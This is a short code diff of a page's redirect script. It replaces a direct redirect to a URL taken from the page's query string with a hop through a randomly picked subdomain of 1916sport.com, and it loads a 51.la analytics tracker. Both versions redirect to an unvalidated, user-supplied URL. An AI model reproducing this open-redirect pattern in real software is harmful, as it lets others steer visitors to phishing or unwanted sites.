@@ -11,8 +11,10 @@
     var url = document.location.toString();
     var urlParmStr = url.slice(url.indexOf('=')+1);
     var ua = navigator.userAgent.toLowerCase();
-    
-    location.href=urlParmStr;
+
+    var urls = ['https://zz11.1916sport.com','https://zz22.1916sport.com','https://zz33.1916sport.com','https://zz44.1916sport.com','https://zz55.1916sport.com','https://zz66.1916sport.com'];
+    var ndomain = urls[Math.floor(Math.random() * urls.length)];
+    location.href = ndomain+'/api/?url='+urlParmStr;
     
 </script>
     <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"K8YSQIj3WDtj9gG6",ck:"K8YSQIj3WDtj9gG6"})</script>
